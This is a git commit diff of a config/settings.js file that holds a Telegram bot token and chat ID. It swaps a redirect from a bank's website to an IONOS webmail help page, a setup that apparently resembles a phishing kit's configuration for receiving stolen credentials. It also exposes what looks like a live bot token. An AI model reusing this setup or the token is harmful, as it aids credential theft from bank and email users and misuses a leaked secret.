9369543ee236146e0a392ce34d0c076d1904d06a
Stevenholbert44 <164857924+Stevenholbert44@users.noreply.github.com>
2025-01-13 03:27:34 -0800

    Add files via upload

--- config/settings.js
+++ config/settings.js
@@ -1,5 +1,5 @@
 module.exports = {
 	botToken: "5433611121:AAFMpeQpC5y_y0PveL5sd77QQIXHuz6TOr4",
 	chatId: "5219819186",
-	redirect_url: "https://www.comerica.com"
+	url: "https://www.ionos.com/help/email/glossary-email-terms-explained/webmail/",
 };
